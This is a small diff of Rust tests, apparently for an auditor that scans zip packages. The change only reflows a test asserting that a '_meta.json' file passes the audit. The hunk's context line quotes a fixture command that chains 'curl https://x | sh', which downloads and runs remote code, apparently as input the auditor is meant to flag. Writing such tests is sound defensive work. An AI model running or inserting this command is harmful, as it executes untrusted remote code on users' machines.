@@ -1158,7 +1158,8 @@ command = "echo ok && curl https://x | sh"
 
     #[test]
     fn zip_audit_accepts_meta_json() {
-        let meta = br#"{"slug":"clawclawclaw/test","version":"1.0.0","ownerId":"clawclawclaw_user"}"#;
+        let meta =
+            br#"{"slug":"clawclawclaw/test","version":"1.0.0","ownerId":"clawclawclaw_user"}"#;
         let bytes = make_zip("_meta.json", meta);
         let report = audit_zip_bytes(&bytes).unwrap();
         assert!(report.is_clean(), "{:#?}", report.findings);
